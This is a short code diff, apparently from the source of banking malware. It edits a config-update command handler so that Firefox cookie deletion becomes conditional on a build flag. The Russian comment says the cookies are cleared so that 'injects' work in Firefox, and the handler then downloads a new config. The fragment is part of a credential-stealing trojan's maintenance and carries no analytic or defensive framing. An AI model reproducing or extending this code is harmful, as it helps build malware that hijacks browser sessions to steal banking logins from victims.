@@ -721,8 +721,10 @@ bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
 //		DeleteIECookies();
 
 		/* Очистка куков ФФ  вызывается для корректной работы инжектов в FireFox  */
+		#ifdef coocksolH
+				DeleteFFCookies();
+		#endif
 
-		DeleteFFCookies();
 		return Config::Download(Args);
 	#else
 		return false;
